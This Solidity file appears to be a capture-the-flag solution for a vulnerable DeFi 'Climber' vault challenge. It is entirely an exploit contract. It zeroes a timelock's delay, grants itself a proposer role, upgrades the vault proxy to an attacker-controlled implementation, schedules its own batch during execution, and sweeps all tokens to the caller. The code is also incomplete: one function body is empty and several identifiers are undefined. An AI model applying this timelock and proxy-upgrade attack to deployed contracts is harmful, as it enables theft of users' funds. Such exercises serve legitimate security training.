// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";
import "./HackedVault.sol";
import "./ClimberTimelock.sol";

error bytes32Error(bytes32);
error intError(uint256);

contract ExploitClimber {

    address proxy;
    ClimberTimelock timelock;
    address token;

    constructor(address _proxy, address _timelock, address _token) {

        proxy = _proxy;
        timelock = ClimberTimelock(payable(_timelock));
        token = _token;
    }

    function scheduleExploit() external {


    }

    function exploit() external {

        HackedVault hacked = new HackedVault();
        uint256 len = 4;
        address[] memory targets = new address[](len);
        uint256[] memory values = new uint256[](len);
        bytes[] memory dataElements = new bytes[](len);

        targets[0] = address(timelock); // updateDelay() call
        targets[1] = address(timelock); // grantRole() call
        targets[2] = address(proxy); // updgradeTo() call
        targets[3] = address(proxy); // scheduleExploit() call

        // No value transfer, only tokens
        for(uint256 i=0;i<targets.length;i++)
            values[i] = 0;

        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(proxy));
        dataElements[2] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(hacked));
        dataElements[3] = abi.encodeWithSelector(HackedVault.scheduleExploit.selector, timelock, hacked, proxy);

        timelock.execute(targets, values, dataElements, 0);
        HackedVault(proxy).sweepFunds(msg.sender, token);
    }
}